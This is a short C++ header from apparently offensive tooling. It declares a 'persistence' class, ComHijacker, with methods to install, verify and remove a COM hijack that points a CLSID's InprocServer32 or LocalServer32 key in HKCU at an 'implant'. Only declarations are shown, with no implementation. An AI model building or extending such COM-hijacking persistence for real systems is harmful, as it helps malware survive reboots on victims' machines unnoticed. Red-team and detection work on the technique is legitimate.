#pragma once
#include <windows.h>
#include <string>

namespace persistence {

class ComHijacker {
public:
    // Hijacks a common CLSID or creates a new one in HKCU
    // to point a server subkey (e.g. InprocServer32 or LocalServer32) to our implant.
    static bool Install(const std::wstring& implantPath, const std::wstring& clsid, const std::wstring& subkey = L"InprocServer32");

    static bool Verify(const std::wstring& clsid, const std::wstring& subkey = L"InprocServer32");

    static bool Uninstall(const std::wstring& clsid, const std::wstring& subkey = L"InprocServer32");
};

} // namespace persistence
